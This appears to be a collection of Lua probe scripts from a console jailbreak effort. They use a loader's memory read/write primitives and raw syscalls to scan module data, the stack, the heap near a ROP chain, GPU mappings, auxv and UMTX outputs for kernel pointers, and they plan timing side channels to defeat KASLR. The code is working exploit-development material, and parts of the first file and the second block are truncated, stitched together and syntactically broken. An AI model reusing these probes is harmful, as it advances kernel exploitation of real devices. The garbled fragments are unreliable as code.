## probes/phase14_final_push/56i8_eboot_data_kptr.lua

```lua
-- CRASH_CLASS: LOW
-- PROBE 56i8: Eboot .data scan + cross-run NID validation + remaining KASLR ideas
--
-- Context: 56i7 proved the 2828 "kernel pointers" in module .data are NID hash tables
-- ({text_offset, nid_hash} packed structs). The table continues below 0xFFFF8000.
--
-- This probe:
--   [B] Scan eboot .data (1.5MB) in safe chunks — 56i7 crashed on this
--   [C] Print first 5 NID table entries as cross-run fingerprint
--       (if dw[1] values change between runs → real kptr; if same → NID hash)
--   [D] Scan libkernel .data EXCLUDING the NID table range
--   [E] Try reading TCB/FS_BASE area for kernel pointers
--   [F] Scan the Lua loader's own globals (near pipe_str/fn_addr addresses)

print("=== PROBE 56i8: EBOOT DATA + CROSS-RUN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end
local function is_any_krange(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF0000 and h < 0xFFFFFFFF
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

local sc_info = make_syscall(593)

-- ============================================================
-- [B] Eboot .data scan — 1.5MB in safe chunks
-- Only scan for values where BOTH dwords look like kernel VA
-- (not packed structs with small offset + hash)
-- ============================================================
print("")
print("[B] Eboot .data scan (true kernel pointers only)")

local eb_info = memory.alloc(0x200)
safe_wd(eb_info, 0x160)
pcall(function() sc_info(uint64(0), eb_info) end)

local ebd_lo = safe_rd(eb_info + 0x118) or 0
local ebd_hi = safe_rd(eb_info + 0x11C) or 0
local ebd_sz = safe_rd(eb_info + 0x120) or 0

print(string.format("  eboot data: 0x%X_%08X size=0x%X", ebd_hi, ebd_lo, ebd_sz))

local eb_true_kptrs = 0
local eb_nid_like = 0

-- Scan full 1.5MB but filter: a TRUE kernel pointer has BOTH halves
-- looking like a kernel address (lo > 0x10000, not a small table offset)
for off = 0, ebd_sz - 1, 8 do
    local a_l = ebd_lo + off
    local a_h = ebd_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
            if vl >= 0x100000 then
                -- Low dword is large — could be real kernel VA low bits
                eb_true_kptrs = eb_true_kptrs + 1
                if eb_true_kptrs <= 20 then
                    print(string.format("  +0x%06X: 0x%08X_%08X TRUE?", off, vh, vl))
                end
            else
                eb_nid_like = eb_nid_like + 1
            end
        end
    end
end
print(string.format("  True kptr candidates: %d  NID-like: %d", eb_true_kptrs, eb_nid_like))

-- ============================================================
-- [C] Cross-run fingerprint — print specific values for comparison
-- Run this twice; if values change → KASLR-shifted → real
-- ============================================================
print("")
print("[C] Cross-run fingerprint")

-- libkernel NID table first 5 entries
local lk_info = memory.alloc(0x200)
safe_wd(lk_info, 0x160)
pcall(function() sc_info(uint64(0x2001), lk_info) end)
local lk_data_lo = safe_rd(lk_info + 0x118) or 0
local lk_data_hi = safe_rd(lk_info + 0x11C) or 0

print("  libkernel NID[0-4]:")
for i = 0, 4 do
    local off = 0x3E38 + i * 8
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    print(string.format("    [%d] %s", i, hexval(val)))
end

-- Also print the NID table START (first entry with hi >= 0xFFFF0000)
-- to see where the table begins
print("  Table start search (data+0x3800..+0x3E38):")
local table_start = nil
for off = 0x3800, 0x3E38, 8 do
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF0000 and not table_start then
            table_start = off
            print(string.format("    First 0xFFFF entry at +0x%04X: %s", off, hexval(val)))
        end
    end
end

-- ============================================================
-- [D] libkernel .data OUTSIDE the NID table
-- NID table is at +0x3D38..+0x42C8 (from 56i7 context)
-- Scan before and after for any real kernel pointers
-- ============================================================
print("")
print("[D] libkernel .data outside NID table")

local lk_data_sz = safe_rd(lk_info + 0x120) or 0
local outside_kptrs = 0

-- Before NID table
for off = 0, 0x3D30, 8 do
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val and is_kptr(val) then
        local vh, vl = get_hi_lo(val)
        -- Skip NID-like (small low dword)
        if vl >= 0x100000 then
            outside_kptrs = outside_kptrs + 1
            print(string.format("  pre-NID +0x%04X: %s", off, hexval(val)))
        end
    end
end

-- After NID table
for off = 0x42D0, lk_data_sz - 1, 8 do
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val and is_kptr(val) then
        local vh, vl = get_hi_lo(val)
        if vl >= 0x100000 then
            outside_kptrs = outside_kptrs + 1
            if outside_kptrs <= 20 then
                print(string.format("  post-NID +0x%04X: %s", off, hexval(val)))
            end
        end
    end
end
print("  Outside-NID kptrs (lo>=0x100000): " .. outside_kptrs)

-- ============================================================
-- [E] Loader internal structures — scan near fn_addr and rop_chain
-- These are the Lua loader's own heap structures
-- ============================================================
print("")
print("[E] Loader internal structures")

local pipe_str = tostring(syscall.pipe)

local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")

    -- Scan 4KB around fn_addr for kernel pointers
    local loader_kptrs = 0
    for off = -0x800, 0x800, 8 do
        local ok2, val = pcall(function()
            if off >= 0 then
                return memory.read_qword(fn_addr + off)
            else
                return memory.read_qword(fn_addr - (-off))

        if ok2 and val and is_kptr(val) then

            if vl >= 0x100000 then
                loader_kptrs = loader_kptrs + 1
                print(string.format("  fn_addr%+d: %s", off, hexval(val)))
            end
        end

    print("  Loader area kptrs: " .. loader_kptrs)
end

-- [F] GPU mmap region scan — our heap R/W area
-- Allocated GPU pages might contain kernel object remnants
-- ============================================================
print("")
print("[F] GPU mmap heap scan")

local sc_mmap = make_syscall(477)
local gpu_ok, gpu_ret = pcall(function()
    return sc_mmap(uint64(0), uint64(64*0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local gpu_addr = gpu_ok and gpu_ret or nil

if gpu_addr then
    local gh, gl = get_hi_lo(gpu_addr)
    print(string.format("  GPU mmap: 0x%X_%08X (64 pages)", gh, gl))

    local gpu_kptrs = 0
    -- Scan first 16 pages for remnant kernel pointers
    for off = 0, 16*0x4000 - 1, 8 do
        local a_l = gl + off
        local a_h = gh
        if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
        local addr = uint64(string.format("0x%X%08X", a_h, a_l))
        local val = safe_rq(addr)
        if val then
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl >= 0x100000 then
                gpu_kptrs = gpu_kptrs + 1
                if gpu_kptrs <= 10 then
                    print(string.format("  +0x%06X: %s", off, hexval(val)))
                end
            end
        end
    end
    print("  GPU heap kptrs: " .. gpu_kptrs)
else
    print("  GPU mmap failed")
end

-- 55e got ret=0 with 0x88 bytes. 56i3 got ret=-1.

end)

        if val and is_kptr(val) then
```

```lua
-- to detect valid vs invalid kernel addresses:

--   [B] Calibrate: measure baseline syscall timing (sys 20 getpid)
--   [C] Use sys 202 sysctl with a MIB that reads kernel memory at a guessed addr
--       — if the address is mapped, it takes longer (page table walk succeeds)
--       — if unmapped, it fails fast (page fault, early return)
--   [D] Alternative: use CClosure redirect to call sysarch(165) with GET_GSBASE
--       but with crafted stack that makes the kernel touch a guessed address
--   [E] Simplest: try mincore(78) on kernel VA guesses

--       — even though mincore returned -1 in 56i probes, the TIMING may differ

    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil

    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil

local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)

-- ============================================================

-- matching kernel sysent table signature
-- FreeBSD sysent entries are {int nargs, sy_call_t *callp, ...}
-- The callp would be a kernel function pointer
-- ============================================================
print("")
print("[F] Large RW region remnant scan")

-- Use sys 674 to find large RW regions (heap segments)
local sc674 = make_syscall(674)
local STRIDE = 72
local MAX_RECORDS = 200
local vm_buf = memory.alloc(STRIDE * MAX_RECORDS)
local countp = memory.alloc(16)
safe_wq(countp, uint64(0))

pcall(function()
    sc674(uint64(vm_buf), uint64(STRIDE), uint64(MAX_RECORDS),
          uint64(countp), uint64(0x40000000))
end)
local count = safe_rd(countp) or 0

-- Find large RW regions and scan first page of each
local rw_kptrs = 0
local rw_scanned = 0
for e = 0, math.min(count - 1, MAX_RECORDS - 1) do
    local base = vm_buf + e * STRIDE
    local start_val = safe_rq(base)
    local end_val = safe_rq(base + 8)
    local prot = safe_rd(base + 0x18) or 0

    if prot == 3 then  -- RW
        local sh, sl = get_hi_lo(start_val)
        local eh, el = get_hi_lo(end_val)
        local size = (eh == sh) and (el - sl) or ((eh - sh) * 0x100000000 + (el - sl))

        -- Scan first 16KB of each RW region
        if size >= 0x4000 then
            rw_scanned = rw_scanned + 1
            for off = 0, 0x3FF8, 8 do
                local a_l = sl + off
                local a_h = sh
                if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end

                                e, off, vh, vl))
                        end
                    end
                end
            end
            if rw_scanned >= 30 then break end  -- cap to avoid timeout
        end
    end
end
print(string.format("  RW regions scanned: %d, true kptrs: %d", rw_scanned, rw_kptrs))
```

## probes/phase14_final_push/56i_unconventional_kaslr.lua

```lua
-- CRASH_CLASS: LOW
-- PROBE 56i: Unconventional KASLR — scan everywhere for kernel pointers
--
-- Context: ALL standard KASLR paths are dead on 14.10:
--   kldstat(308) lethal, kldfirstmod(309) lethal, kldnext(304) lethal
--   modfnext/modfind/modstat all ret=-1
--   AF_ROUTE sanitized, RDMSR blocked, kinfo_proc clean, VM map clean
--
-- This probe scans unconventional locations:
--   [A] Stack bottom / auxv — kernel writes auxiliary vector during exec
--   [B] All 39 module data sections — scan for kernel pointers in globals
--   [C] UMTX operations — futex wait channels may leak kernel addresses
--   [D] sysctl kern.proc.auxv — explicit auxv query
--   [E] Heap near ROP chain — scan loader internals for stale kernel ptrs
--   [F] sigaltstack frame — signal delivery writes kernel-derived data

print("=== PROBE 56i: UNCONVENTIONAL KASLR HUNT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

local function get_module_info(handle)
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc = make_syscall(593)
    local ok = pcall(function() sc(uint64(handle), info) end)
    if not ok then return nil end
    local text_lo = safe_rd(info + 0x108)
    local text_hi = safe_rd(info + 0x10C)
    local text_sz_lo = safe_rd(info + 0x110)
    local data_lo = safe_rd(info + 0x148)
    local data_hi = safe_rd(info + 0x14C)
    local data_sz_lo = safe_rd(info + 0x150)
    return {
        text_lo = text_lo or 0, text_hi = text_hi or 0,
        text_sz_lo = text_sz_lo or 0,
        data_lo = data_lo or 0, data_hi = data_hi or 0,
        data_sz_lo = data_sz_lo or 0,
    }
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- ============================================================
-- [B] Scan all module DATA sections for kernel pointers
-- 39 modules via dynlib_get_info(593), data base at +0x148
-- ============================================================
print("")
print("[B] Module data section scan (39 modules)")

local kptrs_found = 0
local handles = {0, 0x1, 0x2, 0x2001, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16,
    0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20,
    0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A,
    0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33}

local scanned_modules = 0
for _, handle in ipairs(handles) do
    local mi = get_module_info(handle)
    if mi and mi.data_lo ~= 0 and mi.data_sz_lo > 0 then
        scanned_modules = scanned_modules + 1
        local scan_sz = mi.data_sz_lo
        if scan_sz > 0x10000 then scan_sz = 0x10000 end

        local data_addr = uint64(string.format("0x%X%08X", mi.data_hi, mi.data_lo))
        local found_in_mod = 0

        for off = 0, scan_sz - 8, 8 do
            local dh = mi.data_hi
            local dl = mi.data_lo + off
            if dl >= 0x100000000 then
                dh = dh + 1
                dl = dl - 0x100000000
            end
            local addr = uint64(string.format("0x%X%08X", dh, dl))
            local val = safe_rq(addr)
            if val and is_kptr(val) then
                kptrs_found = kptrs_found + 1
                found_in_mod = found_in_mod + 1
                if kptrs_found <= 20 then
                    print(string.format("  *** handle=0x%X data+0x%X: %s KERNEL PTR!",
                        handle, off, hexval(val)))
                end
            end
        end

        if found_in_mod > 0 then
            print(string.format("  handle 0x%X: %d kernel pointers in data section!",
                handle, found_in_mod))
        end
    end
end
print(string.format("  Scanned %d modules, found %d kernel pointers", scanned_modules, kptrs_found))

-- ============================================================
-- [C] sysctl kern.proc.auxv — MIB {1, 14, 16, pid}
-- auxv contains AT_* entries written by kernel during execve
-- AT_ENTRY, AT_PHDR, AT_BASE are userland, but there might be
-- Sony-specific or FreeBSD-specific entries with kernel data
-- ============================================================
print("")
print("[C] sysctl kern.proc.auxv")

local sc_sysctl = make_syscall(202)
local mib = memory.alloc(24)
safe_wd(mib, 1)        -- CTL_KERN
safe_wd(mib + 4, 14)   -- KERN_PROC
safe_wd(mib + 8, 16)   -- KERN_PROC_AUXV
safe_wd(mib + 12, our_pid)

local auxbuf = memory.alloc(0x800)
local oldlenp = memory.alloc(8)
safe_wd(oldlenp, 0x800)
safe_wd(oldlenp + 4, 0)

local ok, ret = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(auxbuf),
        uint64(oldlenp), uint64(0), uint64(0))
end)
local r = -999
if ok then r = to_num(ret) end

if r == 0 then
    local auxlen = safe_rd(oldlenp) or 0
    print(string.format("  auxv ret=0, len=%d bytes", auxlen))

    -- Each Elf_Auxinfo is 16 bytes: { long a_type; union { long a_val; void *a_ptr; } }
    local i = 0
    while i < auxlen and i < 0x800 do
        local atype = safe_rq(auxbuf + i)
        local aval = safe_rq(auxbuf + i + 8)
        if atype == nil then break end

        local at = to_num(atype)
        if at == 0 then break end -- AT_NULL

        local vh, vl = get_hi_lo(aval)
        local tag = ""
        if at == 3 then tag = " (AT_PHDR)"
        elseif at == 4 then tag = " (AT_PHENT)"
        elseif at == 5 then tag = " (AT_PHNUM)"
        elseif at == 6 then tag = " (AT_PAGESZ)"
        elseif at == 7 then tag = " (AT_BASE)"
        elseif at == 8 then tag = " (AT_FLAGS)"
        elseif at == 9 then tag = " (AT_ENTRY)"
        elseif at == 15 then tag = " (AT_EXECPATH)"
        elseif at == 16 then tag = " (AT_CANARY)"
        elseif at == 17 then tag = " (AT_CANARYLEN)"
        elseif at == 18 then tag = " (AT_OSRELDATE)"
        elseif at == 19 then tag = " (AT_NCPUS)"
        elseif at == 20 then tag = " (AT_PAGESIZES)"
        elseif at == 21 then tag = " (AT_PAGESIZESLEN)"
        elseif at == 22 then tag = " (AT_TIMEKEEP)"
        elseif at == 23 then tag = " (AT_STACKPROT)"
        elseif at == 24 then tag = " (AT_EHDRFLAGS)"
        elseif at == 25 then tag = " (AT_HWCAP)"
        elseif at == 26 then tag = " (AT_HWCAP2)"
        end

        print(string.format("  type=%d%s val=%s", at, tag, hexval(aval)))

        if is_kptr(aval) then
            print("    ^^^ KERNEL POINTER!")
        end

        i = i + 16
    end
else
    print(string.format("  auxv ret=%d", r))

    -- Try alternate MIB: {1, 14, 16, pid, 0x800}
    safe_wd(mib + 16, 0x800)
    safe_wd(oldlenp, 0x800)
    safe_wd(oldlenp + 4, 0)
    ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(5), uint64(auxbuf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    r = -999
    if ok then r = to_num(ret) end
    print(string.format("  auxv (5-element MIB) ret=%d", r))
end

-- ============================================================
-- [D] UMTX operations — futex-style ops may leak kernel addresses
-- sys 454 = _umtx_op(void *obj, int op, u_long val, void *uaddr1, void *uaddr2)
-- ops: UMTX_OP_WAIT=2, UMTX_OP_WAKE=3, UMTX_OP_MUTEX_TRYLOCK=5,
--      UMTX_OP_NWAKE_PRIVATE=21
-- On error, kernel may write wait-channel or internal state to output args
-- ============================================================
print("")
print("[D] UMTX operations — check for kernel address leaks")

local sc_umtx = make_syscall(454)
local umtx_obj = memory.alloc(0x100)
local umtx_out1 = memory.alloc(0x100)
local umtx_out2 = memory.alloc(0x100)

-- Zero all buffers
for i = 0, 0xFF, 4 do
    safe_wd(umtx_obj + i, 0)
    safe_wd(umtx_out1 + i, 0)
    safe_wd(umtx_out2 + i, 0)
end

-- UMTX_OP_MUTEX_TRYLOCK = 5
safe_wd(umtx_obj, 0)  -- unowned mutex
local ok2, ret2 = pcall(function()
    return sc_umtx(uint64(umtx_obj), uint64(5), uint64(0),
        uint64(umtx_out1), uint64(umtx_out2))
end)
local ur = ok2 and to_num(ret2) or -999
print(string.format("  UMTX_OP_MUTEX_TRYLOCK ret=%d", ur))
-- Check if kernel wrote anything
for off = 0, 0x3F, 8 do
    local v1 = safe_rq(umtx_out1 + off)
    local v2 = safe_rq(umtx_out2 + off)
    if v1 and is_kptr(v1) then
        print(string.format("    out1+0x%02X: %s KERNEL PTR!", off, hexval(v1)))
    end
    if v2 and is_kptr(v2) then
        print(string.format("    out2+0x%02X: %s KERNEL PTR!", off, hexval(v2)))
    end
end

-- UMTX_OP_SEM2_WAIT = 25 (may write kernel wait info)
for i = 0, 0xFF, 4 do
    safe_wd(umtx_out1 + i, 0)
    safe_wd(umtx_out2 + i, 0)
end
safe_wd(umtx_obj, 1)  -- sem count = 1
local ok3, ret3 = pcall(function()
    return sc_umtx(uint64(umtx_obj), uint64(25), uint64(0),
        uint64(umtx_out1), uint64(umtx_out2))
end)
local ur3 = ok3 and to_num(ret3) or -999
print(string.format("  UMTX_OP_SEM2_WAIT ret=%d", ur3))
for off = 0, 0x3F, 8 do
    local v = safe_rq(umtx_out1 + off)
    if v and is_kptr(v) then
        print(string.format("    out1+0x%02X: %s KERNEL PTR!", off, hexval(v)))
    end
end

-- UMTX_OP_ROBUST_LISTS = 22 (robust futex, may set kernel fields)
for i = 0, 0xFF, 4 do safe_wd(umtx_out1 + i, 0) end
-- Set up a robust list head structure
safe_wq(umtx_obj, uint64(0))          -- list head
safe_wq(umtx_obj + 8, uint64(0))      -- pending
safe_wd(umtx_obj + 16, 0)             -- offset
local ok4, ret4 = pcall(function()
    return sc_umtx(uint64(umtx_obj), uint64(22), uint64(24),
        uint64(0), uint64(0))
end)
local ur4 = ok4 and to_num(ret4) or -999
print(string.format("  UMTX_OP_ROBUST_LISTS ret=%d", ur4))

-- ============================================================
-- [E] Heap scan near ROP chain for kernel pointers
-- The loader's internal structures are near the ropchain.
-- Scan +-0x4000 bytes around it.
-- ============================================================
print("")
print("[E] Heap scan near ROP chain")

local pipe_str = tostring(syscall.pipe)
local rop_addr_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
if rop_addr_str then
    local rop_addr = uint64(rop_addr_str)
    local rh, rl = get_hi_lo(rop_addr)
    print("  ropchain: " .. hexval(rop_addr))

    local heap_kptrs = 0
    -- Scan ropchain - 0x4000 to ropchain + 0x8000
    for off = -0x4000, 0x8000, 8 do
        local scan_l = rl + off
        local scan_h = rh
        if scan_l < 0 then
            scan_h = scan_h - 1
            scan_l = scan_l + 0x100000000
        elseif scan_l >= 0x100000000 then
            scan_h = scan_h + 1
            scan_l = scan_l - 0x100000000
        end
        if scan_h >= 0 then
            local addr = uint64(string.format("0x%X%08X", scan_h, scan_l))
            local val = safe_rq(addr)
            if val and is_kptr(val) then
                heap_kptrs = heap_kptrs + 1
                if heap_kptrs <= 10 then
                    print(string.format("  rop%+05X: %s KERNEL PTR!",
                        off, hexval(val)))
                end
            end
        end
    end
    print(string.format("  Scanned 0xC000 bytes, found %d kernel pointers", heap_kptrs))
end

-- ============================================================
-- [F] AT_TIMEKEEP shared page — kernel maps a page with timing data
-- On FreeBSD, AT_TIMEKEEP points to struct vdso_timehands
-- which the kernel updates. The page itself is kernel-mapped
-- but readable from userland. Its CONTENTS might have kernel ptrs.
-- ============================================================
print("")
print("[F] Check AT_TIMEKEEP / shared page contents")

-- Re-read auxv if we got it
if r == 0 then
    local i = 0
    while i < 0x800 do
        local atype = safe_rq(auxbuf + i)
        local aval = safe_rq(auxbuf + i + 8)
        if atype == nil then break end
        local at = to_num(atype)
        if at == 0 then break end
        if at == 22 then -- AT_TIMEKEEP
            print("  AT_TIMEKEEP addr: " .. hexval(aval))
            -- Scan this page for kernel pointers
            local th, tl = get_hi_lo(aval)
            if tl ~= 0 or th ~= 0 then
                local tk_kptrs = 0
                for off = 0, 0x3FF0, 8 do
                    local scan_l = tl + off
                    local scan_h = th
                    if scan_l >= 0x100000000 then
                        scan_h = scan_h + 1
                        scan_l = scan_l - 0x100000000
                    end
                    local addr = uint64(string.format("0x%X%08X", scan_h, scan_l))
                    local val = safe_rq(addr)
                    if val and is_kptr(val) then
                        tk_kptrs = tk_kptrs + 1
                        print(string.format("    timekeep+0x%04X: %s KERNEL PTR!", off, hexval(val)))
                    end
                end
                print(string.format("    Scanned 0x4000 bytes, %d kernel pointers", tk_kptrs))
            end
        end
        i = i + 16
    end
end

-- ============================================================
-- [G] Stack region scan — find stack from VM map, scan for kernel ptrs
-- Use sys 674 to find the stack region, then scan it
-- ============================================================
print("")
print("[G] Stack region scan via sys 674")

local sc_vmmap = make_syscall(674)
local vm_buf = memory.alloc(0x8000)
local vm_len_buf = memory.alloc(8)
safe_wd(vm_len_buf, 0x8000)
safe_wd(vm_len_buf + 4, 0)

local ok5, ret5 = pcall(function()
    return sc_vmmap(uint64(vm_buf), uint64(vm_len_buf))
end)
local vr = ok5 and to_num(ret5) or -999

if vr == 0 then
    local vm_len = safe_rd(vm_len_buf) or 0
    local entries = math.floor(vm_len / 72)
    print(string.format("  VM map: %d bytes, %d entries", vm_len, entries))

    -- Find stack region (typically highest user VA, prot=0x33 RW)
    local stack_start_h, stack_start_l = 0, 0
    local stack_end_h, stack_end_l = 0, 0
    for e = 0, entries - 1 do
        local base = vm_buf + e * 72
        local start_val = safe_rq(base)
        local end_val = safe_rq(base + 8)
        local prot = safe_rd(base + 0x18) or 0
        -- Stack is usually the highest RW region with name containing "stack"
        -- or at high VA. Read name at +0x20
        local name = ""
        for ci = 0, 15 do
            local b = safe_rd(base + 0x20 + ci)
            if b and b > 0 and b < 128 then
                name = name .. string.char(b)
            end
        end
        if name:find("stack") then
            local sh, sl = get_hi_lo(start_val)
            local eh, el = get_hi_lo(end_val)
            stack_start_h = sh
            stack_start_l = sl
            stack_end_h = eh
            stack_end_l = el
            print(string.format("  Found stack: %s - %s prot=0x%X",
                hexval(start_val), hexval(end_val), prot))
        end
    end

    if stack_start_l ~= 0 or stack_start_h ~= 0 then
        -- Scan last 0x2000 bytes of stack (top, most recent frames)
        local scan_start_l = stack_end_l - 0x2000
        local scan_start_h = stack_end_h
        if scan_start_l < 0 then
            scan_start_h = scan_start_h - 1
            scan_start_l = scan_start_l + 0x100000000
        end

        local stack_kptrs = 0
        for off = 0, 0x1FF8, 8 do
            local sl = scan_start_l + off
            local sh = scan_start_h
            if sl >= 0x100000000 then
                sh = sh + 1
                sl = sl - 0x100000000
            end
            local addr = uint64(string.format("0x%X%08X", sh, sl))
            local val = safe_rq(addr)
            if val and is_kptr(val) then
                stack_kptrs = stack_kptrs + 1
                if stack_kptrs <= 10 then
                    print(string.format("    stack end-%04X: %s KERNEL PTR!",
                        0x2000 - off, hexval(val)))
                end
            end
        end
        print(string.format("  Scanned 0x2000 stack bytes, %d kernel pointers", stack_kptrs))
    else
        print("  Stack region not found in VM map")
    end
else
    print(string.format("  VM map ret=%d", vr))
end

collectgarbage("restart")

print("")
print("=== PROBE 56i COMPLETE ===")
```

## probes/phase14_final_push/56j_timing_kaslr.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 56j: High-resolution timing KASLR + libkernel .bss scan
--
-- Context: sys 624 is useless as timer (VM op counter, all deltas 0).
-- Need clock_gettime(232) for nanosecond resolution.
-- Also: libkernel .data was scanned but .bss may be separate and unscanned.
--
-- Plan:
--   [B] clock_gettime(232) — get nanosecond timer working
--   [C] Timing probe: write() to kernel VA vs userland vs unmapped
--   [D] Scan libkernel full memory range (text end → data end = covers .bss)
--   [E] Scan between modules — gaps may contain loader-allocated structs
--   [F] Try getrusage(117) — may return kernel timing info

print("=== PROBE 56j: TIMING KASLR + BSS SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    -- True kernel pointer: hi in kernel range AND lo looks like real address
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF and l >= 0x100000
end
local function is_any_kernel(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- ============================================================
-- [B] clock_gettime(232) — nanosecond timer
-- struct timespec { time_t tv_sec; long tv_nsec; }
-- CLOCK_MONOTONIC = 4, CLOCK_REALTIME = 0
-- ============================================================
print("")
print("[B] clock_gettime setup")

local sc_clock = make_syscall(232)
local ts = memory.alloc(16)

local function get_ns()
    safe_wq(ts, uint64(0))
    safe_wq(ts + 8, uint64(0))
    pcall(function() sc_clock(uint64(4), uint64(ts)) end)  -- CLOCK_MONOTONIC
    local sec = safe_rd(ts) or 0
    local nsec = safe_rd(ts + 8) or 0
    return sec * 1000000000 + nsec
end

-- Test it
local t1 = get_ns()
local t2 = get_ns()
local t3 = get_ns()
print(string.format("  t1=%d t2=%d t3=%d", t1, t2, t3))
